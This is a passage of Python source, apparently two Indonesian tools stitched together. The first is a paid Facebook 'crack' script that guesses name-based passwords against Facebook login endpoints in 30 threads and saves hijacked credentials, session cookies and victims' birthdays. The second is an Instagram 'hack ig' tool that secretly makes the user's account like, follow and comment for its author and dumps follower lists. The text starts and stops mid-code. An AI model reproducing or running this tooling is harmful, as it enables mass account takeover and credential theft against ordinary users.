    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#LOGIN KEY
def cok():
    os.system("clear")
    print("%s[*] ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI"%(N))
    print("[*] UNTUK MENDAPATKAN COOKIES GUNAKAN TOOLS COOKIEDOUGH EKSTENSION YANG ADA DI KIWI BROWSER (%sdownload browser kiwi di play store%s)"%(H,N))
    print("[*] JIKA TIDAK MENGERTI MENGGUNAKAN TOOLS SILAHKAN HUBUNGI ADMIN DENGAN KETIK '%sADMIN%s'"%(H,N))
    print("[*] JIKA INGIN MENGGUNAKAN FREE USER SILAHKAN HUBUNGI ADMIN UNTUK MENDAPATKAN API KEY GERATIS (%s1 day%s)"%(H,N))
    print("[*] (ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOL)")
    print("[*] SCRIPT TELAH DI UPATE PADA TANGGAL [Sabtu 27 November 2021]")
    memek = input("\n[*] masukan api key kamu : ")
    if memek == '':
        print("\n[!] jangan kosong bro");time.sleep(2);cok()
    elif memek in['admin','Admin','ADMIN']:
        jalan("\n %s* %sAnda akan di alihkan ke whatsapp..."%(O,H));time.sleep(0.02)
        exit(subprocess.Popen(["am","start","https://wa.me/"+requests.get("https://ymbf.yayanxd.my.id/no.txt").text.strip()+"?text=Hello! saya ingin menggunakan tools Brute"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    elif memek in['beli','Beli','BELI']:
        beli_key()
    try:
        kontol = requests.get("https://hakiki-apikey.000webhostapp.com/chek.php?project=ngetes&apikey="+memek).json()
        kadaluarsa = kontol['expired']
        nama = kontol["username"]
        day,month,year = kadaluarsa.split(" ")
        month = bulan_key[month]
        open('license.txt', 'w').write(memek)
        jalan("\n[%s*%s] Hallo %s%s%s apikey anda masih berlaku sampai tanggal: %s%s %s %s%s, silahkan gunakan dengan bijak."%(O,N,H,nama,N,H,day,month,year,N));time.sleep(3)
        exit("[%s!%s] jalankan ulang perintah nya dengan ketik python run.py"%(M,N))
    except KeyError:
        print("\n%s[%s!%s] api key %s%s%s tidak terdaftar di website"%(N,M,N,M,memek,N));time.sleep(2);cok()

def get_license(integer):
    lis = list("abcdefghijklmnopqrstuvwxyz123456789")
    gets = [random.choice(lis) for _ in range(integer)]
    return "".join(gets).upper()

def beli_key():
    os.system("clear")
    digit = random.choice([20])
    digit = get_license(digit)
    logo()
    print("\n [%s+%s] Your key : %s%s%s"%(O,N,H,digit,N))
    print("""\n [%s1%s].%s Daftar premium key%s\n [%s2%s].%s Check harga premium%s\n [%s0%s].%s Exit%s"""%(H,N,O,N,H,N,O,N,M,N,M,N))
    print("%s---------------------------%s>%s>%s>"%(B,M,K,H))
    pil = input(" %s[%s+%s] choose %s:%s "%(N,O,N,M,H))
    while pil == "":
        print("\n %s[%s×%s] jangan kosong bro"%(N,M,N));time.sleep(2);beli_key()
    if pil == "1":
        print ("\n %s[%s!%s] Notice me: mana hari isi dengan angka jangan hurup\n"%(N,M,N))
        hari = input(" %s[%s?%s] mau order berapa hari %s:%s "%(N,M,N,M,H))
        nama = input(" %s[%s?%s] nama anda  %s:%s "%(N,M,N,M,H))
        mail = input(" %s[%s?%s] email anda %s:%s "%(N,M,N,M,H))
        exit(subprocess.Popen(["am","start","https://wa.me/"+requests.get("https://ymbf.yayanxd.my.id/no.txt").text.strip()+"?text=hello admin! tolong konfirmasi kode premium saya.\n* Nama  : "+nama+"\n* EMAIL : "+mail+"\n* KEY     : " +digit+"\n* ORDER : "+hari+"days"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    elif pil == "2":
        cek_harga()
    elif pil == "0":
        cok()
    else:
        print("\n %s[%s×%s] input yang bener"%(N,M,N));time.sleep(2);beli_key()

def cek_harga():
    print ("""
    %s*%s daftar harga Lisensi %s*%s\n
  %s>%s pembayaran via dana/pulsa %s<%s\n
 [%s1%s]%s 5K  (5  rb) Sehari%s
 [%s2%s]%s 25K (25 rb) minggu%s
 [%s3%s]%s 50K (50 rb) 1 bulan%s"""%(O,N,O,N,H,N,H,N,O,N,H,N,O,N,H,N,O,N,H,N))
    input("\n   %s[%s ENTER %s]%s "%(H,O,H,N));beli_key()

# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print(' [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N))
        ___yayanganteng___ = input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
            while True:
                pwek = input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n [*] method : ')
                        if cin == '':
                            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s] input yang bener'%(N,M,N));__yan__()
                    print('\n [ pilih method login - silahkan coba satu² ]\n')
                    print(' [%s1%s]. method API (fast)'%(O,N))
                    print(' [%s2%s]. method mbasic (slow)'%(O,N))
                    print(' [%s3%s]. method mobile (super slow)'%(O,N))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print('\n [ pilih method login - silahkan coba satu² ]\n')
            print(' [%s1%s]. method API (fast)'%(O,N))
            print(' [%s2%s]. method mbasic (slow)'%(O,N))
            print(' [%s3%s]. method mobile (super slow)'%(O,N))
            self.__pler__()
        else:
            print('\n %s[%s×%s] y/t goblok!'%(N,M,N));self.plerr(id)

    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik      '%(N,M,N)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N))
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s* --> %s|%s                %s' % (K,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n [*] method : ')
        if yan == '':
            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('2', '02'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('3', '03'):
            print('\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print(' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
            print('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        kirim.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n %s[%s×%s] input yang bener'%(N,M,N));self.__pler__()

___logo___ = ("""%s       HEMKEL: IG
%s\x1b[1;90m ___ ___ ___ __  __ ___ _   _ __  __
%s\x1b[1;90m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
%s\x1b[1;90m|  _/   / _|| |\/| || || |_| | |\/| |
%s\x1b[1;90m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
"""%(P,B,B,H,H))
# Proxy
try:
    __res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('Data/proxy.txt','w').write(__res)
except:
    __sep = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy3.txt').text
    open('Data/proxy.txt','w').write(__sep)
# Requests Session

# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print("\n%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Tumbal Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
    try:
        ___cookie___ = input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
        if ___cookie___ in ['open','Open']:
            print("%s[%s!%s]%s Anda Akan Diarahkan Ke Wa"%(M,H,M,H))
            os.system("xdg-open https://wa.me/+6281295853971");exit()
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        ___vps = ___cookie___.split('ds_user_id=')[1];___user___ = ___vps.split(';')[0]
        open('Data/user.txt','w').write(___user___)
        __get = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
        open('kuki.txt','w').write(___cookie___)
        print("%s[%s*%s]%s HELLO :%s %s"%(B,P,B,P,H,__get['full_name']))
        ___cookies___()
    except (KeyError):
        exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
    except (ValueError):
        exit("%s[%s!%s]%s Cookie Instagram Tidak Bisa Digunakan Harap Ganti Dengan Akun Lain"%(P,M,P,M))
    except (IndexError):
        exit("%s[%s!%s]%s Cookie Error Tidak Ada {ds_user_id=}"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Headers
def ___header___():
    try:
        ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2);___login___()
    return ___head
# Cek Cookie
def ___cookies___():
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___cok = ___cookie___.split('sessionid=')[1]; ___kuki = ___cok.split(';')[0]
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗'])
        ____head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___kuki,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        ___rex = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers=____head).text
        ___rex2 = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers=____head).text # Jangan Di Ubah!
        ___rex3 = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers=____head,data=___data).text
        if '"status":"ok"' in str(___rex):
            print("%s[%s*%s]%s Login Berhasil"%(P,H,P,H));sleep(2)
            ___menu___()
        else:
            print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
            os.system('rm -rf kuki.txt');___login___()
    except (KeyError):
        os.system('rm -rf kuki.txt');exit("%s[%s!%s]%s Cookie Error"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Daftar Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        print("\n%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        __inf = requests.get('https://i.instagram.com/api/v1/users/'+open('Data/user.txt','r').read()+'/info/', headers=___head).json()['user']
        print("%s[%s>%s]%s——————————————————————————————"%(K,P,K,P))
        print("%s[%s•%s]%s Selamat datang:%s %s"%(H,P,H,P,K,__inf['full_name']))
        print("%s[%s•%s]%s pengguna:%s %s"%(H,P,H,P,K,open('Data/user.txt','r').read()))
        print("%s[%s•%s]%s Follower :%s %s"%(H,P,H,P,K,__inf['follower_count']))
        print("%s[%s>%s]%s——————————————————————————————\n"%(K,P,K,P))
    except (KeyError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        os.system('rm -rf kuki.txt');sleep(2)
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    print("%s[%s1%s]%s Cari username Dari Mengikuti"%(B,P,B,P))
    print("%s[%s2%s]%s Cari username Dari Pengikut"%(B,P,B,P))
    print("%s[%s3%s]%s Cari username Dari Beranda"%(B,P,B,P))
    print("%s[%s4%s]%s Cari username Dari Hastag"%(B,P,B,P))
    print("%s[%s5%s]%s Cari username Dari Search"%(B,P,B,P))
    print("%s[%s6%s]%s Cari username Dari Query"%(B,P,B,P))
    print("%s[%s7%s]%s Cari user Dari Email"%(B,P,B,P))
    print("%s[%s8%s]%s Mulai Hack ig %s{%sFast%s}"%(B,H,B,H,B,K,B))
    print("%s[%s9%s]%s Lihat Hasil Hack ig"%(B,P,B,P))
    print("%s[%sA%s]%s Cara Menggunakan"%(B,P,B,P))
    print("%s[%s0%s]%s KELUAR\n"%(B,P,B,P))
    ___menu___ = input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
    if ___menu___ in ['1','01']:
        ___mengikuti___()
    elif ___menu___ in ['2','02']:
        ___pengikut___()
    elif ___menu___ in ['3','03']:
        ___beranda___()
    elif ___menu___ in ['4','04']:
        ___hastag___()
    elif ___menu___ in ['5','05']:
        ___search___()
    elif ___menu___ in ['6','06']:
        ___query___()
    elif ___menu___ in ['7','07']:
        ___email___()
    elif ___menu___ in ['8','08']:
       ___password___()
    elif ___menu___ in ['9','09']:
        print("\n%s[%s1%s]%s Lihat Hasil Results/Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Hasil Results/Cp.txt"%(B,P,B,P))
        print("%s[%s0%s]%s Keluar %s{%sExit%s}"%(B,P,B,P,B,H,B))
        ___hasil___ = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
        if ___hasil___ in ['1','01']:
            os.system('cat Results/Ok.txt')
            exit("\n")
        elif ___hasil___ in ['2','02']:
            os.system('cat Results/Cp.txt')
            exit("\n")
        elif ___hasil___ in ['0','00']:
            exit()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['a','A']:
        print("\n%s[%s!%s]%s Anda Akan Diarahkan Ke Facebook Atau Browser!"%(M,H,M,H))
        os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
        exit("%s[%s?%s]%s Ketik {python Prem.py}"%(P,H,P,H))
    elif ___menu___ in ['0','00']:
        os.system('rm -rf kuki.txt')
        exit("%s[%s!%s]%s Menghapus Cookie..."%(P,K,P,K))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Dump Mengikuti
def ___mengikuti___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
        ___nama = __res['full_name'].replace(' ','_') + '.txt'
        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
        print("%s[%s?%s]%s Mengikuti :%s %s"%(B,P,B,P,H,__res['edge_follow']['count']))
        print("%s   "%(P))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+__res['id']+'/following/?count=5000', headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
